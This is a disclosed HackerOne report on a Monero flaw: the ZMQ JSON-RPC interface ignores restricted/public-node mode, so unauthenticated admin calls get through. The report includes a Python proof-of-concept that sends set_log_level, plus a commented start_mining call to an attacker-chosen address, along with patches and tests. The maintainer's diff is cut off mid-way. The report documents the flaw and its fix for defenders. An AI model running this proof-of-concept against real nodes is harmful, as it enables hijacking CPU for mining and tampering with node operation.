---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2026-08-17
submitted: 2026-03-12T20:45:26.814Z
bounty_usd: null
votes: 40
cve: []
program: "[[programs/monero|Monero]]"
reporter: "usagirabbit"
source: "https://hackerone.com/reports/3601469"
title: "Restricted RPC Policy Bypass on ZMQ JSON-RPC Allows Unauthenticated Remote Admin Actions"
---
# Restricted RPC Policy Bypass on ZMQ JSON-RPC Allows Unauthenticated Remote Admin Actions

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 40 | **Program:** Monero | **Disclosed:** 2026-08-17

- Report: [https://hackerone.com/reports/3601469](https://hackerone.com/reports/3601469)
- CWE: Improper Authentication - Generic
- Submitted: 2026-03-12T20:45:26.814Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

I found a high-severity access-control issue in Monero's ZMQ JSON-RPC surface.

When `monerod` is started in restricted/public-node mode, the HTTP RPC layer correctly suppresses admin-only methods, but the ZMQ JSON-RPC layer does not inherit or enforce that restriction. If an operator binds ZMQ beyond loopback, an unauthenticated remote client can invoke state-changing methods that the operator reasonably expects `--restricted-rpc` / `--public-node` to block.

The vulnerable flow is:

1. [README.md](README.md#L769) says public remote nodes must run with `--restricted-rpc`.
2. [src/daemon/command_line_args.h](src/daemon/command_line_args.h#L106) describes `--public-node` as "restricted RPC mode, view-only commands".
3. [src/rpc/core_rpc_server.h](src/rpc/core_rpc_server.h#L117) hides HTTP admin methods behind `!m_restricted`.
4. [src/daemon/daemon.cpp](src/daemon/daemon.cpp#L105) creates the ZMQ handler without propagating restricted-mode state in the vulnerable version.
5. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L941) dispatches the exposed ZMQ methods unconditionally in the vulnerable version.

This exposes the following restricted HTTP methods over ZMQ:

1. `start_mining`
2. `stop_mining`
3. `save_bc`
4. `set_log_level`
5. `mining_status`
6. `get_peer_list`

The highest-impact path is `start_mining`, because [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L483) accepts an attacker-controlled payout address and attacker-controlled thread count up to `hardware_concurrency() * 4`.

 It is an RPC access-control bypass.

## Severity

Approximate CVSS v3.1: `8.1` with `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`.

I consider this `High`.

Why `8.1` is defensible:

1. The attacker is remote and unauthenticated.
2. The attack requires only a normal ZMQ JSON-RPC request once the operator has exposed ZMQ beyond loopback.
3. The affected methods cross a documented restricted/view-only boundary.
4. `start_mining` can redirect CPU resources to an attacker-controlled address and materially degrade node availability.

The default ZMQ bind is loopback-only at [src/daemon/command_line_args.h](src/daemon/command_line_args.h#L112), so exploitation requires a non-loopback ZMQ bind. That does not remove the vulnerability because the product-level issue is that restricted/public-node policy does not carry across RPC surfaces, and ZMQ also lacks the HTTP-side external-bind confirmation gate shown at [src/rpc/rpc_args.cpp](src/rpc/rpc_args.cpp#L99).

## Affected Versions

`git log --follow` shows the ZMQ JSON-RPC handler path originates with commit `77986023c` (`json serialization for rpc-relevant monero types`).

`git tag --contains 77986023c` shows the issue is present in released tags beginning with `v0.12.0.0`.

Conservatively, I believe the affected release range is:

1. `v0.12.0.0` and later releases containing ZMQ JSON-RPC
2. all `v0.13.x`
3. all `v0.14.x`
4. all `v0.15.x`
5. all `v0.16.x`
6. all `v0.17.x`
7. all `v0.18.x`
8. current `master`

Operational note: exploitability requires that the operator expose ZMQ RPC beyond loopback, for example with `--zmq-rpc-bind-ip 0.0.0.0` or a publicly reachable IPv6 bind.

## AI Usage Disclosure

This report was prepared with AI assistance for drafting, editing, and organizing the findings.

All substantive technical claims retained here were checked against the local source tree, local repository history, and local build/test results before inclusion.

I did not test against public Monero infrastructure or third-party nodes.

## Root Cause

Monero has an explicit restricted-RPC policy on the HTTP surface:

1. [README.md](README.md#L769) says `--restricted-rpc` is mandatory for public remote nodes.
2. [src/daemon/command_line_args.h](src/daemon/command_line_args.h#L106) describes `--public-node` as restricted/view-only.
3. [src/rpc/core_rpc_server.h](src/rpc/core_rpc_server.h#L117) and nearby lines gate HTTP admin methods behind `!m_restricted`.

Examples from the HTTP route map:

```cpp
MAP_URI_AUTO_JON2_IF("/start_mining", on_start_mining, COMMAND_RPC_START_MINING, !m_restricted)
MAP_URI_AUTO_JON2_IF("/stop_mining", on_stop_mining, COMMAND_RPC_STOP_MINING, !m_restricted)
MAP_URI_AUTO_JON2_IF("/mining_status", on_mining_status, COMMAND_RPC_MINING_STATUS, !m_restricted)
MAP_URI_AUTO_JON2_IF("/save_bc", on_save_bc, COMMAND_RPC_SAVE_BC, !m_restricted)
MAP_URI_AUTO_JON2_IF("/get_peer_list", on_get_peer_list, COMMAND_RPC_GET_PEER_LIST, !m_restricted)
MAP_URI_AUTO_JON2_IF("/set_log_level", on_set_log_level, COMMAND_RPC_SET_LOG_LEVEL, !m_restricted)
```

By contrast, the vulnerable ZMQ path did not carry restricted mode into the handler:

```cpp
struct zmq_internals
{
  explicit zmq_internals(t_core& core, t_p2p& p2p)
    : rpc_handler{core.get(), p2p.get()}
    , server{rpc_handler}
  {}
};
```

And [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L80) exposed the sensitive methods unconditionally:

```cpp
constexpr const handler_map handlers[] =
{
  {u8"get_peer_list", handle_message<GetPeerList>},
  {u8"mining_status", handle_message<MiningStatus>},
  {u8"save_bc", handle_message<SaveBC>},
  {u8"set_log_level", handle_message<SetLogLevel>},
  {u8"start_mining", handle_message<StartMining>},
  {u8"stop_mining", handle_message<StopMining>}
};
```

Finally, the vulnerable dispatcher executed the handler as long as the method name existed:

```cpp
const std::string request_type = req_full.getRequestType();
const auto matched_handler = std::lower_bound(std::begin(handlers), std::end(handlers), request_type);
if (matched_handler == std::end(handlers) || matched_handler->method_name != request_type)
  return BAD_REQUEST(request_type, req_full.getID());

return matched_handler->call(*this, req_full.getID(), req_full.getMessage());
```

There was no restricted-mode denial between request parsing and handler dispatch.

## Affected Code

Relevant locations:

1. [README.md](README.md#L769)
2. [src/daemon/command_line_args.h](src/daemon/command_line_args.h#L106)
3. [src/rpc/rpc_args.cpp](src/rpc/rpc_args.cpp#L99)
4. [src/rpc/core_rpc_server.h](src/rpc/core_rpc_server.h#L117)
5. [src/daemon/daemon.cpp](src/daemon/daemon.cpp#L61)
6. [src/daemon/daemon.cpp](src/daemon/daemon.cpp#L105)
7. [src/rpc/daemon_handler.h](src/rpc/daemon_handler.h#L50)
8. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L80)
9. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L483)
10. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L611)
11. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L728)
12. [src/rpc/daemon_handler.cpp](src/rpc/daemon_handler.cpp#L941)

## Validation

I validated this finding locally by:

1. confirming that the vulnerable ZMQ path had no restricted-state propagation or method gate
2. confirming that HTTP restricted mode deliberately suppresses the same methods
3. implementing a patch that propagates restricted mode into the ZMQ handler and blocks the restricted method subset
4. compiling the patched daemon target
5. compiling the unit test target
6. running a regression test for the restricted-method set

Commands used for validation:

```bash
make -C build-audit daemon -j4
make -C build-audit unit_tests -j4
./build-audit/tests/unit_tests/unit_tests --gtest_filter=ZmqDaemonHandler.RestrictedMethodParity
```

Observed regression-test result:

```text
Note: Google Test filter = ZmqDaemonHandler.RestrictedMethodParity
[==========] Running 1 test from 1 test suite.
[----------] 1 test from ZmqDaemonHandler
[ RUN      ] ZmqDaemonHandler.RestrictedMethodParity
[       OK ] ZmqDaemonHandler.RestrictedMethodParity (0 ms)
[  PASSED  ] 1 test.
```

I did not test against public Monero infrastructure or third-party nodes.

## Proof of Concept

The following PoC targets a vulnerable build. It demonstrates the access-control bypass over ZMQ on a node the operator believes is running in restricted/view-only mode.

### 1. Start a vulnerable daemon with restricted HTTP RPC but externally bound ZMQ RPC

```bash
./monerod \
  --non-interactive \
  --offline \
  --data-dir /tmp/monero-zmq-vuln \
  --restricted-rpc \
  --rpc-bind-ip 0.0.0.0 \
  --confirm-external-bind \
  --zmq-rpc-bind-ip 0.0.0.0 \
  --zmq-rpc-bind-port 18082
```

Notes:

1. `--restricted-rpc` and the public-node guidance imply view-only remote access.
2. ZMQ external bind does not require the HTTP-side `--confirm-external-bind` safeguard.
3. The daemon can remain otherwise local/offline; the bypass is about RPC authorization, not blockchain sync.

### 2. From another host, send a restricted method over ZMQ JSON-RPC

Install a ZMQ client library if needed:

```bash
python3 -m pip install pyzmq
```

PoC script:

```python
#!/usr/bin/env python3
import json
import zmq

RPC_VERSION = 2 << 16  # 131072

ctx = zmq.Context.instance()
sock = ctx.socket(zmq.REQ)
sock.connect("tcp://TARGET_IP:18082")

def call(method, params):
    request = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": method,
        "params": {
            "rpc_version": RPC_VERSION,
            **params,
        },
    }
    sock.send_json(request)
    response = sock.recv_json()
    print(f"method={method}")
    print(json.dumps(response, indent=2, sort_keys=True))
    print()

# Fully reproducible auth-bypass demonstration with no extra daemon state needed.
call("set_log_level", {"level": 4})

# Same surface, higher impact path. Any valid address for the daemon nettype works.
# Uncomment on a vulnerable mainnet/default daemon to demonstrate CPU/resource theft.
# call("start_mining", {
#     "miner_address": "<valid_monero_address>",
#     "threads_count": 8,
#     "do_background_mining": False,
#     "ignore_battery": True,
# })
```

### 3. Expected result on a vulnerable build

For `set_log_level`, the vulnerable daemon returns success even though the node is in restricted mode:

```json
{
  "id": 1,
  "jsonrpc": "2.0",
  "result": {
    "rpc_version": 131072,
    "status": "OK"
  }
}
```

That response is enough to demonstrate the authorization failure. The same request path can then invoke `start_mining`, `stop_mining`, `save_bc`, `mining_status`, and `get_peer_list`.

### 4. Expected result on the patched build

The patched build denies the same request:

```json
{
  "error": {
    "code": 1,
    "error_str": "Failed",
    "message": "\"set_log_level\" is not available in restricted mode."
  },
  "id": 1,
  "jsonrpc": "2.0"
}
```

## Proposed Patch

The patch below works cross-platform because it only changes in-process flag propagation and RPC-method gating. It does not depend on platform-specific networking APIs.

```diff
diff --git a/src/daemon/daemon.cpp b/src/daemon/daemon.cpp
index 9b6d63d3d..c67c69108 100644
--- a/src/daemon/daemon.cpp
+++ b/src/daemon/daemon.cpp
@@ -60,8 +60,8 @@ namespace daemonize {
 
 struct zmq_internals
 {
-  explicit zmq_internals(t_core& core, t_p2p& p2p)
-    : rpc_handler{core.get(), p2p.get()}
+  explicit zmq_internals(t_core& core, t_p2p& p2p, bool restricted)
+    : rpc_handler{core.get(), p2p.get(), restricted}
     , server{rpc_handler}
   {}
 
@@ -104,7 +104,7 @@ public:
 
     if (!command_line::get_arg(vm, daemon_args::arg_zmq_rpc_disabled))
     {
-      zmq.reset(new zmq_internals{core, p2p});
+      zmq.reset(new zmq_internals{core, p2p, restricted});
 
       const std::string zmq_port = command_line::get_arg(vm, daemon_args::arg_zmq_rpc_bind_port);
       const std::string zmq_address = command_line::get_arg(vm, daemon_args::arg_zmq_rpc_bind_ip);
diff --git a/src/rpc/daemon_handler.cpp b/src/rpc/daemon_handler.cpp
index 6df71340a..849a9499e 100644
--- a/src/rpc/daemon_handler.cpp
+++ b/src/rpc/daemon_handler.cpp
@@ -107,14 +107,33 @@ namespace rpc
       {u8"start_mining", handle_message<StartMining>},
       {u8"stop_mining", handle_message<StopMining>}
     };
+
+    constexpr const char* restricted_methods[] =
+    {
+      "get_peer_list",
+      "mining_status",
+      "save_bc",
+      "set_log_level",
+      "start_mining",
+      "stop_mining"
+    };
   } // anonymous
 
-  DaemonHandler::DaemonHandler(cryptonote::core& c, t_p2p& p2p)
-    : m_core(c), m_p2p(p2p)
+  DaemonHandler::DaemonHandler(cryptonote::core& c, t_p2p& p2p, bool restricted)
+    : m_core(c), m_p2p(p2p), m_restricted(restricted)
   {
     const auto last_sorted = std::is_sorted_until(std::begin(handlers), std::end(handlers));
     if (last_sorted != std::end(handlers))
       throw std::logic_error{std::string{"ZMQ JSON-RPC handlers map is not properly sorted, see "} + last_sorted->method_name};
+
+    const auto last_restricted = std::is_sorted_until(std::begin(restricted_methods), std::end(restricted_methods));
+    if (last_restricted != std::end(restricted_methods))
+      throw std::logic_error{std::string{"ZMQ restricted-method map is not properly sorted, see "} + *last_restricted};
+  }
+
+  bool DaemonHandler::is_restricted_method(const std::string& method) noexcept
+  {
+    return std::binary_search(std::begin(restricted_methods), std::end(restricted_methods), method);
   }
 
   void DaemonHandler::handle(const GetHeight::Request& req, GetHeight::Response& res)
@@ -928,6 +947,14 @@ namespace rpc
       FullMessage req_full(std::move(request), true);
 
       const std::string request_type = req_full.getRequestType();
+      if (m_restricted && is_restricted_method(request_type))
+      {
+        Message fail;
+        fail.status = Message::STATUS_FAILED;
+        fail.error_details = std::string{"\""} + request_type + "\" is not available in restricted mode.";
+        return FullMessage::getResponse(fail, req_full.getID());
+      }
+
       const auto matched_handler = std::lower_bound(std::begin(handlers), std::end(handlers), request_type);
       if (matched_handler == std::end(handlers) || matched_handler->method_name != request_type)
         return BAD_REQUEST(request_type, req_full.getID());
diff --git a/src/rpc/daemon_handler.h b/src/rpc/daemon_handler.h
index 1da5419d2..be0dd9ce8 100644
--- a/src/rpc/daemon_handler.h
+++ b/src/rpc/daemon_handler.h
@@ -51,10 +51,12 @@ class DaemonHandler : public RpcHandler
 {
   public:
 
-    DaemonHandler(cryptonote::core& c, t_p2p& p2p);
+    DaemonHandler(cryptonote::core& c, t_p2p& p2p, bool restricted = false);
 
     ~DaemonHandler() { }
 
+    static bool is_restricted_method(const std::string& method) noexcept;
+
     void handle(const GetHeight::Request& req, GetHeight::Response& res);
 
     void handle(const GetBlocksFast::Request& req, GetBlocksFast::Response& res);
@@ -143,6 +145,7 @@ class DaemonHandler : public RpcHandler
 
     cryptonote::core& m_core;
     t_p2p& m_p2p;
+    bool m_restricted;
 };
 
 }  // namespace rpc
diff --git a/tests/unit_tests/zmq_rpc.cpp b/tests/unit_tests/zmq_rpc.cpp
index 240251d1b..2c6a6102a 100644
--- a/tests/unit_tests/zmq_rpc.cpp
+++ b/tests/unit_tests/zmq_rpc.cpp
@@ -37,6 +37,7 @@
 #include "cryptonote_basic/cryptonote_format_utils.h"
 #include "json_serialization.h"
 #include "net/zmq.h"
+#include "rpc/daemon_handler.h"
 #include "rpc/message.h"
 #include "rpc/zmq_pub.h"
 #include "rpc/zmq_server.h"
@@ -69,6 +70,18 @@ TEST(ZmqFullMessage, Request)
   EXPECT_STREQ("foo", parsed.getRequestType().c_str());
 }
 
+TEST(ZmqDaemonHandler, RestrictedMethodParity)
+{
+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("get_peer_list"));
+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("mining_status"));
+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("save_bc"));
+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("set_log_level"));
+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("start_mining"));
+  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("stop_mining"));
+  EXPECT_FALSE(cryptonote::rpc::DaemonHandler::is_restricted_method("get_height"));
+  EXPECT_FALSE(cryptonote::rpc::DaemonHandler::is_restricted_method("send_raw_tx"));
+}
+
 namespace
 {
   using published_json = std::pair<std::string, rapidjson::Document>;
```

## Hardening Notes

The patch above closes the high-severity admin-method bypass. Two follow-up hardening ideas remain:

1. add a ZMQ equivalent of HTTP's `--confirm-external-bind` safeguard
2. consider whether ZMQ read-only methods such as `get_info` and `get_transaction_pool` should also mirror HTTP restricted-mode redaction semantics

Those follow-ups are lower-severity design-parity issues. The attached patch addresses the reportable `8.1` access-control bypass.

## Bounty Payment


If accepted, please use this monero payout address:

`46Xi9JyEnEjYDuBWYrWNo8MLKyQ1BiL1VbFMJoZkrL2w8ZABc7ALQoyRspCgnkQKbwgPuM6wJEqoCF7U1Cpxo5981Uhr8TN`

## Impact

An unauthenticated remote client can bypass Monero's documented restricted/view-only RPC boundary over ZMQ and perform actions that should be unavailable on a public restricted node.

Practical impact includes:

1. `start_mining`: start CPU mining to an attacker-controlled address with attacker-controlled thread count, causing resource theft and service degradation
2. `stop_mining`: stop legitimate mining
3. `save_bc`: force immediate blockchain save / extra disk I/O
4. `set_log_level`: change runtime logging behavior
5. `get_peer_list`: expose information restricted HTTP intentionally hides
6. `mining_status`: reveal operational mining state that restricted HTTP intentionally hides

It is an access-control failure on a remotely reachable daemon-management interface.

## Timeline

- **Report Filed**
- **2026-03-12** @usagirabbit: Update:
  I completed the end-to-end validation locally.

  I built and ran an unpatched `monerod` from a separate worktree with:
  - `--restricted-rpc`
  - HTTP RPC bound to `127.0.0.1`
  - ZMQ RPC enabled on `127.0.0.1:28082`

  I then sent a raw ZMQ JSON-RPC request for `set_log_level`, which is supposed to be
  unavailable in restricted mode. The vulnerable daemon accepted it and returned:

  ```json
  {"jsonrpc":"2.0","id":1,"result":{"rpc_version":131072}}
 ```
  I also patched the ZMQ handler so restricted mode is propagated into the daemon ZMQ. RPC surface and the restricted-method subset is denied there just like on HTTP. After rebuilding, I reran the exact same ZMQ request against the patched daemon and it returned:
```json
  {"jsonrpc":"2.0","id":1,"error":
  {"code":1,"error_str":"Failed","message":"\"set_log_level\" is not available in
  restricted mode."}}
```
  One correction to the draft patch: the restricted-method lookup must use lexical
  string comparison (std::string_view), not const char*, otherwise the sorted-check/binary-search logic is incorrect.

New fix:
```diff
  --- a/src/daemon/daemon.cpp
  +++ b/src/daemon/daemon.cpp
  @@ -60,8 +60,8 @@ namespace daemonize {

   struct zmq_internals
   {
  -  explicit zmq_internals(t_core& core, t_p2p& p2p)
  -    : rpc_handler{core.get(), p2p.get()}
  +  explicit zmq_internals(t_core& core, t_p2p& p2p, bool restricted)
  +    : rpc_handler{core.get(), p2p.get(), restricted}
       , server{rpc_handler}
     {}

  @@ -104,7 +104,7 @@ public:

       if (!command_line::get_arg(vm, daemon_args::arg_zmq_rpc_disabled))
       {
  -      zmq.reset(new zmq_internals{core, p2p});
  +      zmq.reset(new zmq_internals{core, p2p, restricted});

         const std::string zmq_port = command_line::get_arg(vm,
  daemon_args::arg_zmq_rpc_bind_port);
         const std::string zmq_address = command_line::get_arg(vm,
  daemon_args::arg_zmq_rpc_bind_ip);
  diff --git a/src/rpc/daemon_handler.h b/src/rpc/daemon_handler.h
  index 1da5419d2..be0dd9ce8 100644
  --- a/src/rpc/daemon_handler.h
  +++ b/src/rpc/daemon_handler.h
  @@ -51,10 +51,12 @@ class DaemonHandler : public RpcHandler
   {
     public:

  -    DaemonHandler(cryptonote::core& c, t_p2p& p2p);
  +    DaemonHandler(cryptonote::core& c, t_p2p& p2p, bool restricted = false);

       ~DaemonHandler() { }

  +    static bool is_restricted_method(const std::string& method) noexcept;
  +
       void handle(const GetHeight::Request& req, GetHeight::Response& res);

       void handle(const GetBlocksFast::Request& req, GetBlocksFast::Response& res);
  @@ -143,6 +145,7 @@ class DaemonHandler : public RpcHandler

       cryptonote::core& m_core;
       t_p2p& m_p2p;
  +    bool m_restricted;
   };

   }  // namespace rpc
  diff --git a/src/rpc/daemon_handler.cpp b/src/rpc/daemon_handler.cpp
  index 6df71340a..7e65471e9 100644
  --- a/src/rpc/daemon_handler.cpp
  +++ b/src/rpc/daemon_handler.cpp
  @@ -31,6 +31,7 @@
   #include <algorithm>
   #include <cstring>
   #include <stdexcept>
  +#include <string_view>

   #include <boost/uuid/nil_generator.hpp>
   #include <boost/utility/string_ref.hpp>
  @@ -107,14 +108,33 @@ namespace rpc
         {u8"start_mining", handle_message<StartMining>},
         {u8"stop_mining", handle_message<StopMining>}
       };
  +
  +    constexpr const std::string_view restricted_methods[] =
  +    {
  +      "get_peer_list",
  +      "mining_status",
  +      "save_bc",
  +      "set_log_level",
  +      "start_mining",
  +      "stop_mining"
  +    };
     } // anonymous

  -  DaemonHandler::DaemonHandler(cryptonote::core& c, t_p2p& p2p)
  -    : m_core(c), m_p2p(p2p)
  +  DaemonHandler::DaemonHandler(cryptonote::core& c, t_p2p& p2p, bool restricted)
  +    : m_core(c), m_p2p(p2p), m_restricted(restricted)
     {
       const auto last_sorted = std::is_sorted_until(std::begin(handlers),
  std::end(handlers));
       if (last_sorted != std::end(handlers))
         throw std::logic_error{std::string{"ZMQ JSON-RPC handlers map is not properly
  sorted, see "} + last_sorted->method_name};
  +
  +    const auto last_restricted =
  std::is_sorted_until(std::begin(restricted_methods), std::end(restricted_methods));
  +    if (last_restricted != std::end(restricted_methods))
  +      throw std::logic_error{
  +        std::string{"ZMQ restricted-method map is not properly sorted, see "} +
  +        std::string{*last_restricted}
  +      };
  +  }
  +
  +  bool DaemonHandler::is_restricted_method(const std::string& method) noexcept
  +  {
  +    return std::binary_search(std::begin(restricted_methods),
  std::end(restricted_methods), std::string_view{method});
     }

     void DaemonHandler::handle(const GetHeight::Request& req, GetHeight::Response&
  res)
  @@ -928,6 +948,14 @@ namespace rpc
         FullMessage req_full(std::move(request), true);

         const std::string request_type = req_full.getRequestType();
  +      if (m_restricted && is_restricted_method(request_type))
  +      {
  +        Message fail;
  +        fail.status = Message::STATUS_FAILED;
  +        fail.error_details = std::string{"\""} + request_type + "\" is not
  available in restricted mode.";
  +        return FullMessage::getResponse(fail, req_full.getID());
  +      }
  +
         const auto matched_handler = std::lower_bound(std::begin(handlers),
  std::end(handlers), request_type);
         if (matched_handler == std::end(handlers) || matched_handler->method_name !=
  request_type)
           return BAD_REQUEST(request_type, req_full.getID());
  diff --git a/tests/unit_tests/zmq_rpc.cpp b/tests/unit_tests/zmq_rpc.cpp
  index 240251d1b..2c6a6102a 100644
  --- a/tests/unit_tests/zmq_rpc.cpp
  +++ b/tests/unit_tests/zmq_rpc.cpp
  @@ -37,6 +37,7 @@
   #include "cryptonote_basic/cryptonote_format_utils.h"
   #include "json_serialization.h"
   #include "net/zmq.h"
  +#include "rpc/daemon_handler.h"
   #include "rpc/message.h"
   #include "rpc/zmq_pub.h"
   #include "rpc/zmq_server.h"
  @@ -69,6 +70,18 @@ TEST(ZmqFullMessage, Request)
     EXPECT_STREQ("foo", parsed.getRequestType().c_str());
   }

  +TEST(ZmqDaemonHandler, RestrictedMethodParity)
  +{
  +
  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("get_peer_list"));
  +
  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("mining_status"));
  +  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("save_bc"));
  +
  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("set_log_level"));
  +
  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("start_mining"));
  +  EXPECT_TRUE(cryptonote::rpc::DaemonHandler::is_restricted_method("stop_mining"));
  +  EXPECT_FALSE(cryptonote::rpc::DaemonHandler::is_restricted_method("get_height"));
  +
  EXPECT_FALSE(cryptonote::rpc::DaemonHandler::is_restricted_method("send_raw_tx"));
  +}
  +
   namespace
   {
     using published_json = std::pair<std::string, rapidjson::Document>;
```
  The initial report used const char* for the restricted-method table, which was wrong because the sorted check / binary search would compare pointer values rather than lexical string values. The updated fix above uses std::string_view and is the version I built and validated end-to-end locally.
- **Report Triaged**
- **2026-03-16** @usagirabbit: Any updates?
- **2026-03-16** @selsta: Not yet, I will add a comment here once I have an update.
- **2026-03-27** @selsta: ```diff
diff --git a/src/daemon/command_line_args.h b/src/daemon/command_line_args.h
index 291ebbd63..8509e748e 100644
--- a/src/daemon/command_line_args.h
+++ b/src/daemon/command_line_args.h
@@ -133,6 +133,19 @@ namespace daemon_args
   , "Address for ZMQ pub - tcp://ip:port or ipc://path"
   };
 
+  const command_line::arg_descriptor<bool> arg_restricted_zmq_rpc = {
+    "restricted-zmq-rpc"
+  , "Restrict ZMQ RPC to view-only / non-sensitive methods"
+  , false
+  };
+
+  const command_line::arg_descriptor<bool> arg_confirm_zmq_rpc_external_bind = {
+    "confirm-zmq-rpc-external-bind"
+  , "Confirm zmq-rpc-bind-ip value is NOT a loopback (local) IP"
+  , false
+  };
+
+
   const command_line::arg_descriptor<bool> arg_zmq_rpc_disabled = {
     "no-zmq"
   , "Disable ZMQ RPC server"
diff --git a/src/daemon/daemon.cpp b/src/daemon/daemon.cpp
index 9b6d63d3d..7a2ee937a 100644
--- a/src/daemon/daemon.cpp
+++ b/src/daemon/daemon.cpp
@@ -31,6 +31,7 @@
 #include <memory>
 #include <stdexcept>
 #include <boost/algorithm/string/split.hpp>
+#include <boost/asio/ip/address.hpp>
 #include "misc_log_ex.h"
 #include "daemon/daemon.h"
 #include "rpc/daemon_handler.h"
@@ -58,10 +59,39 @@ using namespace epee;
 
 namespace daemonize {
 
+namespace
+{
+  void verify_zmq_rpc_bind(const boost::program_options::variables_map& vm)
+  {
+    std::string bind_ip = command_line::get_arg(vm, daemon_args::arg_zmq_rpc_bind_ip);
+    if (bind_ip.empty())
+      return;
+
+    // ZMQ bind input already accepts bracketed IPv6 literals, but
+    // boost::asio::ip::make_address does not.
+    if (bind_ip.size() >= 2 && bind_ip.front() == '[' && bind_ip.back() == ']')
+      bind_ip = bind_ip.substr(1, bind_ip.size() - 2);
+
+    boost::system::error_code ec{};
+    const auto parsed_ip = boost::asio::ip::make_address(bind_ip, ec);
+    if (ec)
+      throw std::runtime_error{"Invalid IP address given for --" + std::string(daemon_args::arg_zmq_rpc_bind_ip.name)};
+
+    if (!parsed_ip.is_loopback() && !command_line::get_arg(vm, daemon_args::arg_confirm_zmq_rpc_external_bind))
+    {
+      throw std::runtime_error{
+        std::string{"--"} + daemon_args::arg_zmq_rpc_bind_ip.name +
+        " permits inbound unencrypted external connections. Consider SSH tunnel or SSL proxy instead. Override with --" +
+        daemon_args::arg_confirm_zmq_rpc_external_bind.name
+      };
+    }
+  }
+}
+
 struct zmq_internals
 {
-  explicit zmq_internals(t_core& core, t_p2p& p2p)
-    : rpc_handler{core.get(), p2p.get()}
+  explicit zmq_internals(t_core& core, t_p2p& p2p, const bool restricted)
+    : rpc_handler{core.get(), p2p.get(), restricted}
     , server{rpc_handler}
   {}
 
@@ -104,7 +134,10 @@ public:
 
     if (!command_line::get_arg(vm, daemon_args::arg_zmq_rpc_disabled))
     {
-      zmq.reset(new zmq_internals{core, p2p});
+      verify_zmq_rpc_bind(vm);
+
+      const bool restricted = command_line::get_arg(vm, daemon_args::arg_restricted_zmq_rpc);
+      zmq.reset(new zmq_internals{core, p2p, restricted});
 
       const std::string zmq_port = command_line::get_arg(vm, daemon_args::arg_zmq_rpc_bind_port);
       const std::string zmq_address = command_line::get_arg(vm, daemon_args::arg_zmq_rpc_bind_ip);
@@ -138,6 +171,14 @@ public:
       {
         MWARNING("WARN: --zmq-rpc-bind-ip has no effect because --no-zmq was specified");
       }
+      else if (command_line::get_arg(vm, daemon_args::arg_confirm_zmq_rpc_external_bind))
+      {
+        MWARNING("WARN: --confirm-zmq-rpc-external-bind has no effect because --no-zmq was specified");
+      }
+      else if (command_line::get_arg(vm, daemon_args::arg_restricted_zmq_rpc))
+      {
+        MWARNING("WARN: --restricted-zmq-rpc has no effect because --no-zmq was specified");
+      }
       else if (!command_line::get_arg(vm, daemon_args::arg_zmq_pub).empty())
       {
         MWARNING("WARN: --zmq-pub has no effect because --no-zmq was specified");
diff --git a/src/daemon/main.cpp b/src/daemon/main.cpp
index 78e907a9f..b455b4f78 100644
--- a/src/daemon/main.cpp
+++ b/src/daemon/main.cpp
@@ -157,6 +157,8 @@ int main(int argc, char const * argv[])
       command_line::add_arg(core_settings, daemon_args::arg_zmq_rpc_bind_ip);
       command_line::add_arg(core_settings, daemon_args::arg_zmq_rpc_bind_port);
       command_line::add_arg(core_settings, daemon_args::arg_zmq_pub);
+      command_line::add_arg(core_settings, daemon_args::arg_confirm_zmq_rpc_external_bind);
+      command_line::add_arg(core_settings, daemon_args::arg_restricted_zmq_rpc);
       command_line::add_arg(core_settings, daemon_args::arg_zmq_rpc_disabled);
       command_line::add_arg(core_settings, daemonizer::arg_non_interactive);
 
diff --git a/src/rpc/CMakeLists.txt b/src/rpc/CMakeLists.txt
index f7caed6d8..868574783 100644
--- a/src/rpc/CMakeLists.txt
+++ b/src/rpc/CMakeLists.txt
@@ -47,6 +47,7 @@ set(rpc_pub_sources zmq_pub.cpp)
 
 set(daemon_rpc_server_sources
   daemon_handler.cpp
+  zmq_restricted_methods.cpp
   zmq_pub.cpp
   zmq_server.cpp)
 
@@ -79,6 +80,7 @@ set(daemon_rpc_server_private_headers
   message.h
   daemon_messages.h
   daemon_handler.h
+  zmq_restricted_methods.h
   zmq_server.h)
 
 
diff --git a/src/rpc/daemon_handler.cpp b/src/rpc/daemon_handler.cpp
index 6df71340a..880fa3290 100644
--- a/src/rpc/daemon_handler.cpp
+++ b/src/rpc/daemon_handler.cpp
@@ -27,6 +27,7 @@
 // THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
 #include "daemon_handler.h"
+#include "rpc/zmq_restricted_methods.h"
 
 #include <algorithm>
 #include <cstring>
@@ -109,12 +110,14 @@ namespace rpc
     };
   } // anonymous
 
-  DaemonHandler::DaemonHandler(cryptonote::core& c, t_p2p& p2p)
-    : m_core(c), m_p2p(p2p)
+  DaemonHandler::DaemonHandler(cryptonote::core& c, t_p2p& p2p, bool restricted)
+    : m_core(c), m_p2p(p2p), m_restricted(restricted)
   {
